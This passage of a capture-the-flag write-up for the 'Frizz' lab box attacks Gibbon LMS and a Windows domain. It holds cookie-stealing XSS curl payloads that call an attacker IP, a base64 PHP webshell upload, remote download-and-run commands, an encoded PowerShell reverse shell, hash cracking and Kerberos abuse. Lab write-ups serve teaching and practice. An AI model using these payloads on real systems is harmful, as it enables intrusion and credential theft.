+<li><p><a class="reference external" href="https://herolab.usd.de/security-advisories/usd-2023-0024/">CVE-2023-45881</a></p></li>
+</ul>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-i<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-x<span class="w"> </span><span class="s2">&quot;http://localhost:8080&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--url<span class="w"> </span><span class="s2">&quot;http://frizzdc.frizz.htb/Gibbon-LMS/modules/Planner/resources_addQuick_ajaxProcess.php&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;id=body&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;bodyfile1=@file.jpg;filename=&lt;img src=x onerror=new Image().src=&#39;http://10.10.16.84:9090?cookie=&#39;+document.cookie&gt;.jpg&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;imagesAsLinks=Y&quot;</span><span class="w">  </span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-i<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--url<span class="w"> </span><span class="s2">&quot;http://localhost/modules/Planner/resources_addQuick_ajaxProcess.php&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;id=body&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;bodyfile1=@file.jpg;filename=&lt;img src=x onerror=new Image().src=&#39;http://10.10.16.71:9090?cookie=&#39;+document.cookie&gt;.jpg&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;imagesAsLinks=Y&quot;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-i<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-x<span class="w"> </span>http://localhost:8080<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--url<span class="w"> </span><span class="s1">&#39;http://frizzdc.frizz.htb/Gibbon-LMS/modules/Planner/resources_addQuick_ajaxProcess.php&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;id=body&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;bodyaddress=&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;bodyfile1=nothing;filename=../&lt;img src=X onerror=eval(atob(&#39;YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&#39;))&gt;.gif&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;bodyfile2=&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;bodyfile3=&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;bodyfile4=&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;imagesAsLinks=Y&quot;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-i<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-x<span class="w"> </span>http://localhost:8080<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--url<span class="w"> </span><span class="s1">&#39;http://frizzdc.frizz.htb/Gibbon-LMS/modules/Planner/resources_addQuick_ajaxProcess.php&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;id=body&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;bodyaddress=&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;bodyfile1=nothing;filename=../&lt;img src=x onerror=new Image().src=&#39;http://10.10.16.71:1111?cookie=&#39;+document.cookie&gt;.jpg&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;bodyfile2=&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;bodyfile3=&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;bodyfile4=&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;imagesAsLinks=Y&quot;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">filename</span><span class="o">=</span><span class="s2">&quot;../&lt;img src=X onerror=eval(atob(&#39;YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&#39;))&gt;.gif&quot;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-i<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--url<span class="w"> </span><span class="s2">&quot;http://localhost/modules/Planner/resources_addQuick_ajaxProcess.php&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;id=body&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;bodyfile1=@hamster.jpg;filename=&lt;img src=x onerror=new Image().src=&#39;http://10.10.16.71:9090?cookie=&#39;+document.cookie&gt;.jpg&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;imagesAsLinks=Y&quot;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-i<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--url<span class="w"> </span><span class="s2">&quot;http://localhost/modules/Planner/resources_addQuick_ajaxProcess.php&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;id=body&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;bodyfile1=@hamster.jpg;filename=&lt;img src=X onerror=eval(atob(&#39;YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&#39;))&gt;.gif&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;imagesAsLinks=Y&quot;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>http://localhost/index.php?q<span class="o">=</span>/modules/Planner/planner_view_full.php<span class="p">&amp;</span><span class="nv">gibbonPlannerEntryID</span><span class="o">=</span><span class="m">00000000000001</span><span class="p">&amp;</span><span class="nv">viewBy</span><span class="o">=</span>date<span class="p">&amp;</span><span class="nv">gibbonCourseClassID</span><span class="o">=</span><span class="p">&amp;</span><span class="nv">date</span><span class="o">=</span><span class="m">2025</span>-03-20<span class="p">&amp;</span><span class="nv">width</span><span class="o">=</span><span class="m">1000</span><span class="p">&amp;</span><span class="nv">height</span><span class="o">=</span><span class="m">5500</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-i<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-x<span class="w"> </span>http://localhost:8080<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--url<span class="w"> </span><span class="s2">&quot;http://localhost/modules/Rubrics/rubrics_visualise_saveAjax.php&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;img=image/png;asdf,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKT8%2b&amp;path=asdf.php&amp;gibbonPersonID=0000000001&#39;</span>
+</pre></div>
+</div>
+</section>
+<section id="cve-2023-45878-arbitrary-file-write">
+<h2>CVE-2023-45878 - Arbitrary File Write<a class="headerlink" href="#cve-2023-45878-arbitrary-file-write" title="Permalink to this heading">#</a></h2>
+<p>This one ended up being that one that worked for me, the poc is a simple file inclusion that drops a php webshell at the root of the webserver</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">POST</span> <span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="n">Rubrics</span><span class="o">/</span><span class="n">rubrics_visualise_saveAjax</span><span class="o">.</span><span class="n">php</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="n">Host</span><span class="p">:</span> <span class="n">localhost</span><span class="p">:</span><span class="mi">8080</span>
+<span class="p">[</span><span class="o">...</span><span class="p">]</span>
+
+
+<span class="n">img</span><span class="o">=</span><span class="n">image</span><span class="o">/</span><span class="n">png</span><span class="p">;</span><span class="n">asdf</span><span class="p">,</span><span class="n">PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKT8</span><span class="o">%</span><span class="mi">2</span><span class="n">b</span><span class="o">&amp;</span><span class="n">path</span><span class="o">=</span><span class="n">asdf</span><span class="o">.</span><span class="n">php</span><span class="o">&amp;</span><span class="n">gibbonPersonID</span><span class="o">=</span><span class="mi">0000000001</span>
+</pre></div>
+</div>
+<p>Doing that with curl</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-i<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-x<span class="w"> </span>http://localhost:8080<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--url<span class="w"> </span><span class="s1">&#39;http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39; img=image/png;asdf,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKT8%2b&amp;path=asdf.php&amp;gibbonPersonID=0000000001&#39;</span>
+</pre></div>
+</div>
+<p>With that webshell I’m uploading a PowerJoker shell</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">powershell</span> <span class="o">-</span><span class="n">c</span> <span class="n">iwr</span> <span class="s2">&quot;http://10.10.16.71:9090/joke.ps1&quot;</span> <span class="o">-</span><span class="n">o</span> <span class="o">./</span><span class="n">joke</span><span class="o">.</span><span class="n">ps1</span>
+<span class="n">powershell</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;./joke.ps1&quot;</span>
+</pre></div>
+</div>
+</section>
+<section id="database-credentials-exposure">
+<h2>Database credentials exposure<a class="headerlink" href="#database-credentials-exposure" title="Permalink to this heading">#</a></h2>
+<p>We know gibbon typically uses a mysql db, Looking at the source files, it seems the creds are stored here</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">type </span><span class="n">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">htdocs</span><span class="p">\</span><span class="n">Gibbon-LMS</span><span class="p">\</span><span class="n">config</span><span class="p">.</span><span class="n">php</span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$databaseServer = &#39;localhost&#39;;
+$databaseUsername = &#39;MrGibbonsDB&#39;;
+$databasePassword = &#39;Mist********&#39;;
+$databaseName = &#39;gibbon&#39;;
+</pre></div>
+</div>
+</section>
+<section id="pivot-with-chisel">
+<h2>Pivot with Chisel<a class="headerlink" href="#pivot-with-chisel" title="Permalink to this heading">#</a></h2>
+<p>Building chisel for windows</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">GOOS</span><span class="o">=</span>windows<span class="w"> </span>go<span class="w"> </span>build<span class="w"> </span>.
+</pre></div>
+</div>
+<p>Get it on the box</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">iwr </span><span class="s2">&quot;http://10.10.16.71:9090/chisel.exe&quot;</span> <span class="n">-o</span> <span class="p">./</span><span class="n">chisel</span><span class="p">.</span><span class="n">exe</span>
+</pre></div>
+</div>
+<p>Running a socks5 proxy</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>./chisel<span class="w"> </span>server<span class="w"> </span>-p<span class="w"> </span><span class="m">4040</span><span class="w"> </span>--socks5<span class="w"> </span>--reverse
+./chisel.exe<span class="w"> </span>client<span class="w"> </span><span class="m">10</span>.10.16.71:4040<span class="w"> </span>R:1080:socks
+</pre></div>
+</div>
+<p>Access the database through the proxy</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>proxychains<span class="w"> </span>mysql<span class="w"> </span>-u<span class="w"> </span>MrGibbonsDB<span class="w"> </span>-h<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>--password<span class="o">=</span><span class="s1">&#39;Mist********&#39;</span><span class="w"> </span>-D<span class="w"> </span>gibbon<span class="w"> </span>--skip-ssl<span class="w"> </span>-A
+</pre></div>
+</div>
+<p>Pillage the database to get f.frizzle’s hash</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>MariaDB<span class="w"> </span><span class="o">[</span>gibbon<span class="o">]</span>&gt;<span class="w"> </span><span class="k">select</span><span class="w"> </span>username,passwordstrong,passwordstrongsalt<span class="w"> </span>from<span class="w"> </span>gibbonperson<span class="p">;</span>
++-----------+------------------------------------------------------------------+------------------------+
+<span class="p">|</span><span class="w"> </span>username<span class="w">  </span><span class="p">|</span><span class="w"> </span>passwordstrong<span class="w">                                                   </span><span class="p">|</span><span class="w"> </span>passwordstrongsalt<span class="w">     </span><span class="p">|</span>
++-----------+------------------------------------------------------------------+------------------------+
+<span class="p">|</span><span class="w"> </span>f.frizzle<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="m">067</span>*************************************************************<span class="w"> </span><span class="p">|</span><span class="w"> </span>/aACFhikmNopqrRTVz2489<span class="w"> </span><span class="p">|</span>
++-----------+------------------------------------------------------------------+------------------------+
+<span class="m">1</span><span class="w"> </span>row<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span><span class="o">(</span><span class="m">0</span>.408<span class="w"> </span>sec<span class="o">)</span>
+</pre></div>
+</div>
+</section>
+<section id="crack-salted-sha256">
+<h2>Crack salted sha256<a class="headerlink" href="#crack-salted-sha256" title="Permalink to this heading">#</a></h2>
+<p>This is a salted sha256</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>wl-paste<span class="p">|</span>wc<span class="w"> </span>-c
+<span class="m">64</span>
+</pre></div>
+</div>
+<p>Looking at <code class="docutils literal notranslate"><span class="pre">passwordResetProcess.php</span></code>, according to the source code it’s hashed like that:</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="x">//Update password</span>
+<span class="x">$salt = getSalt();</span>
+<span class="x">$passwordStrong = hash(&#39;sha256&#39;, $salt.$passwordNew);</span>
+</pre></div>
+</div>
+<p>So in hashcat format that would be:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>hash.txt
+<span class="m">067</span>******************************************************:/aACFhikmNopqrRTVz2489
+</pre></div>
+</div>
+<p>And according to the source code it’s mode 1420</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>1420 | sha256($salt.$pass)                                        | Raw Hash salted and/or iterated
+</pre></div>
+</div>
+<p>This laptop is ancient, I can’t run hashcat on it so I’m starting a digital ocean droplet</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>doctl<span class="w"> </span>compute<span class="w"> </span>droplet<span class="w"> </span>create<span class="w"> </span><span class="nb">test</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--size<span class="w"> </span>s-4vcpu-8gb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--image<span class="w"> </span>ubuntu-24-10-x64<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--region<span class="w"> </span>lon1<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--ssh-keys<span class="w"> </span><span class="m">45956874</span>
+</pre></div>
+</div>
+<p>Install hashcat on it and clinfo to make sure we have a working Open CL runtime on the machine</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>apt-get<span class="w"> </span>install<span class="w"> </span>hashcat<span class="w"> </span>clinfo
+</pre></div>
+</div>
+<p>Get rockyou in the box</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>scp<span class="w"> </span>~/.local/share/seclists/rockyou.txt<span class="w"> </span>root@134.***********:
+</pre></div>
+</div>
+<p>And run hashcat</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">1420</span><span class="w"> </span><span class="nb">hash</span><span class="w"> </span>rockyou.txt
+</pre></div>
+</div>
+<p>We quickly crack the password</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>hashcat<span class="w"> </span>-m1420<span class="w"> </span>--show<span class="w"> </span><span class="nb">hash</span>
+<span class="m">067</span>******************************************************:/aACFhikmNopqrRTVz2489:Je**********
+</pre></div>
+</div>
+<p>And we can delete the droplet</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>doctl<span class="w"> </span>compute<span class="w"> </span>droplet<span class="w"> </span>delete<span class="w"> </span><span class="nb">test</span>
+</pre></div>
+</div>
+</section>
+<section id="ssh-with-kerberos">
+<h2>SSH with Kerberos<a class="headerlink" href="#ssh-with-kerberos" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ssh<span class="w"> </span>f.frizzle@frizz.htb
+f.frizzle@frizz.htb:<span class="w"> </span>Permission<span class="w"> </span>denied<span class="w"> </span><span class="o">(</span>gssapi-with-mic,keyboard-interactive<span class="o">)</span>.
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>timedatectl<span class="w"> </span>set-ntp<span class="w"> </span><span class="nb">false</span>
+sudo<span class="w"> </span>ntpdate<span class="w"> </span>frizz.htb
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>getTGT.py<span class="w"> </span>frizz.htb/f.frizzle:Je**********
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saving</span> <span class="n">ticket</span> <span class="ow">in</span> <span class="n">f</span><span class="o">.</span><span class="n">frizzle</span><span class="o">.</span><span class="n">ccache</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>f.frizzle.ccache
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>kinit
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>klist
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Ticket</span> <span class="n">cache</span><span class="p">:</span> <span class="n">FILE</span><span class="p">:</span><span class="n">f</span><span class="o">.</span><span class="n">frizzle</span><span class="o">.</span><span class="n">ccache</span>
+<span class="n">Default</span> <span class="n">principal</span><span class="p">:</span> <span class="n">f</span><span class="o">.</span><span class="n">frizzle</span><span class="nd">@FRIZZ</span><span class="o">.</span><span class="n">HTB</span>
+
+<span class="n">Valid</span> <span class="n">starting</span>       <span class="n">Expires</span>              <span class="n">Service</span> <span class="n">principal</span>
+<span class="mi">03</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">00</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">17</span>  <span class="mi">03</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">10</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">17</span>  <span class="n">krbtgt</span><span class="o">/</span><span class="n">FRIZZ</span><span class="o">.</span><span class="n">HTB</span><span class="nd">@FRIZZ</span><span class="o">.</span><span class="n">HTB</span>
+	<span class="n">renew</span> <span class="n">until</span> <span class="mi">03</span><span class="o">/</span><span class="mi">24</span><span class="o">/</span><span class="mi">2025</span> <span class="mi">00</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">17</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>vim<span class="w"> </span>/etc/krb5.conf
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">libdefaults</span><span class="p">]</span>
+    <span class="n">default_realm</span> <span class="o">=</span> <span class="n">FRIZZ</span><span class="o">.</span><span class="n">HTB</span>
+    <span class="n">dns_lookup_realm</span> <span class="o">=</span> <span class="n">false</span>
+    <span class="n">dns_lookup_kdc</span> <span class="o">=</span> <span class="n">true</span>
+
+<span class="p">[</span><span class="n">realms</span><span class="p">]</span>
+    <span class="n">FRIZZ</span><span class="o">.</span><span class="n">HTB</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="n">kdc</span> <span class="o">=</span> <span class="n">frizz</span><span class="o">.</span><span class="n">htb</span>
+        <span class="n">admin_server</span> <span class="o">=</span> <span class="n">frizz</span><span class="o">.</span><span class="n">htb</span>
+    <span class="p">}</span>
+
+<span class="p">[</span><span class="n">domain_realm</span><span class="p">]</span>
+    <span class="o">.</span><span class="n">frizz</span><span class="o">.</span><span class="n">htb</span> <span class="o">=</span> <span class="n">FRIZZ</span><span class="o">.</span><span class="n">HTB</span>
+    <span class="n">frizz</span><span class="o">.</span><span class="n">htb</span> <span class="o">=</span> <span class="n">FRIZZ</span><span class="o">.</span><span class="n">HTB</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>~/.ssh/config
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">KexAlgorithms</span> <span class="n">diffie</span><span class="o">-</span><span class="n">hellman</span><span class="o">-</span><span class="n">group18</span><span class="o">-</span><span class="n">sha512</span><span class="p">,</span><span class="n">ecdh</span><span class="o">-</span><span class="n">sha2</span><span class="o">-</span><span class="n">nistp521</span>
+<span class="n">Host</span> <span class="o">*</span>
+    <span class="n">GSSAPIAuthentication</span> <span class="n">yes</span>
+    <span class="n">GSSAPIDelegateCredentials</span> <span class="n">yes</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ssh<span class="w"> </span>-v<span class="w"> </span>f.frizzle@FRIZZ.HTB
+</pre></div>
+</div>
+</section>
+<section id="bloodhound">
+<h2>BloodHound<a class="headerlink" href="#bloodhound" title="Permalink to this heading">#</a></h2>
+<p>Get sharphound on the box</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>iwr<span class="w"> </span><span class="s2">&quot;http://10.10.16.71:9090/SharpHound.exe&quot;</span><span class="w"> </span>-OutFile<span class="w"> </span>./SharpHound.exe
+</pre></div>
+</div>
+<p>Run it</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>.<span class="se">\S</span>harpHound.exe<span class="w"> </span>-c<span class="w"> </span>all
+</pre></div>
+</div>
+<p>Exfiltrate the results</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>scp<span class="w"> </span>f.frizzle@FRIZZ.HTB:Documents/20250322182342_BloodHound.zip<span class="w"> </span>.
+</pre></div>
+</div>
+</section>
+<section id="credential-exposure">
+<h2>Credential exposure<a class="headerlink" href="#credential-exposure" title="Permalink to this heading">#</a></h2>
+<p>There’s a 7z archive in there, out of that shtuff, whatever that is there’s a config file with a password in it, and it seems relevant if you read it in reverse.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>wl-paste<span class="p">|</span>base64<span class="w"> </span>-d
+!sub**********
+</pre></div>
+</div>
+</section>
+<section id="tgt-as-m-schoolbus">
+<h2>TGT as m.schoolbus<a class="headerlink" href="#tgt-as-m-schoolbus" title="Permalink to this heading">#</a></h2>
+<p>We can get a TGT out of that password as m.schoolbus</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>getTGT.py<span class="w"> </span>frizz.htb/m.schoolbus:<span class="s1">&#39;!sub**********&#39;</span>
+</pre></div>
+</div>
+<p>SSH didn’t work for me the first time though so I started looking around for things I could do with that TGT</p>
+<p>We could pass the TGT, also didn’t work</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>psexec.py<span class="w"> </span>frizz.htb/m.schoolbus@frizz.htb<span class="w"> </span>-k<span class="w"> </span>-no-pass
+wmiexec.py<span class="w"> </span>frizz.htb/m.schoolbus@frizz.htb<span class="w"> </span>-k<span class="w"> </span>-no-pass
+smbexec.py<span class="w"> </span>frizz.htb/m.schoolbus@frizz.htb<span class="w"> </span>-k<span class="w"> </span>-no-pass
+</pre></div>
+</div>
+<p>Kerberoasting, also didn’t work</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>GetUserSPNs.py<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-dc-host<span class="w"> </span>FRIZZ.HTB<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>FRIZZ.HTB/f.frizzle<span class="w"> </span>-k<span class="w"> </span>-no-pass
+</pre></div>
+</div>
+<p>Trying to see if I could change user directly in powershell, didn’t work</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span>Start-Process -FilePath “powershell.exe” -Credential $Credential
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$Cred</span> <span class="p">=</span> <span class="nb">Get-Credential</span>
+<span class="nb">Enter-PSSession</span> <span class="n">-Cred</span> <span class="nv">$Cred</span> <span class="n">-Computername</span> <span class="n">frizzdc</span>
+</pre></div>
+</div>
+<p>With Nishang, didn’t work</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">cp Invoke-PowerShellTcpOneLine</span><span class="p">.</span><span class="n">ps1</span> <span class="p">~/</span><span class="n">www</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">cat Invoke-PowerShellTcpOneLine</span><span class="p">.</span><span class="n">ps1</span> <span class="p">|</span> <span class="n">iconv</span> <span class="n">-t</span> <span class="n">utf16le</span> <span class="p">|</span> <span class="n">base64</span> <span class="n">-w0</span> <span class="p">&gt;</span> <span class="n">nish</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Start-Process</span> <span class="n">-FilePath</span> <span class="n">powershell</span> <span class="n">-argumentlist</span> <span class="s2">&quot;-enc IwAkAHMAbQA9ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAxADAALgAxADYALgA3ADEAJwAsADQAMgA0ADIAKQApAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB0AD0AMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpAD0AJABzAG0ALgBSAGUAYQBkACgAJABiAHQALAAwACwAJABiAHQALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHQALAAwACwAJABpACkAOwAkAHMAdAA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAKABpAGUAeAAgACQAZAAgADIAPgAmADEAKQApADsAJABzAG0ALgBXAHIAaQB0AGUAKAAkAHMAdAAsADAALAAkAHMAdAAuAEwAZQBuAGcAdABoACkAfQAKAA==&quot;</span> <span class="n">-Credential</span> <span class="nv">$Cred</span>
+</pre></div>
+</div>
+<p>After a good night sleep and a box reset, SSH as m.schoolbus just worked…</p>
+</section>
+<section id="abuse-writegplink">
+<h2>Abuse WriteGPLink<a class="headerlink" href="#abuse-writegplink" title="Permalink to this heading">#</a></h2>
+<p>The graph when looking at m.schoolbus’s outbound access control looks kinda cool</p>
+<p><img alt="cool.png" src="../../../../_images/cool.png" /></p>
+<p>More specifically that’s the interesting bit</p>
+<p><img alt="bit.png" src="../../../../_images/bit.png" /></p>
+<p>m.schoolbus has WriteGPLink over those 2 OUs which have genericWrite over the Administrators group, at the time of my SharpHound collection m.schoolbus, was a member of Administrator, but I assume it’s because of somebody else’s exploitation of this very misconfiguration, as when looking at group membership for m.schoolbus in the box right now, I don’t think we’re a member</p>
